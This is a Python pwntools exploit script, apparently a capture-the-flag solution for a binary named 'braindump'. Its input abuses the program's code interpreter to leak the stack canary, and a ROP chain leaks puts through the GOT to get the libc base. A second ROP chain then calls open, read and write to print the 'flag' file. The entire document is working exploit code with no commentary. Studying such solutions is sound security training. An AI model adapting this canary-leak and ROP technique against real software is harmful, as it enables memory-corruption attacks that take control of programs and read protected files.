from pwn import *

def packAll(rop):
    return flat([p64(x) for x in rop])

r = process('./braindump')
e = ELF('./braindump')
libc = e.libc
prdi = 0x0000000000400e93
prbp = 0x0000000000400a10
prsi_p = 0x0000000000400e91
buf = 0x00000000006020e0
again = 0x0000000000400D74

rop = []
rop += [prdi, e.got['puts']]
rop += [e.plt['puts']]
rop += [prbp, buf+0x220]
rop += [again]
r.sendlineafter('Enter your code:', '!>'*(0x200-8)+'!>!:'*8+'!>'*8+'!.'+'!>!.'*len(packAll(rop)))
r.sendline(packAll(rop))

canary = '\x00'+r.recv(7)

r.recvuntil('RTFM!\n')
puts = u64(r.recv(6)+'\x00\x00')
libc_base = puts - libc.symbols['puts']
log.info('libc base: 0x%x' % libc_base)

open_ = libc_base + libc.symbols['open']
read = libc_base + libc.symbols['read']
write = libc_base + libc.symbols['write']
#libc:
prdx = libc_base + 0x0000000000001b92

# open 'flag'
rop = []
rop += [prdi, buf]
rop += [prsi_p, 0, 0]
rop += [open_]

# read from 'flag'
rop += [prdi, 3]
rop += [prsi_p, buf+8, 0]
rop += [prdx, 0x100]
rop += [read]

# write to stdout
rop += [prdi, 1]
rop += [prsi_p, buf+8, 0]
rop += [prdx, 0x100]
rop += [write]

rop += []
r.sendlineafter('Enter your code:', 'flag\x00'+'A'*(0x218-5)+canary+'A'*0x8+packAll(rop))
r.interactive()
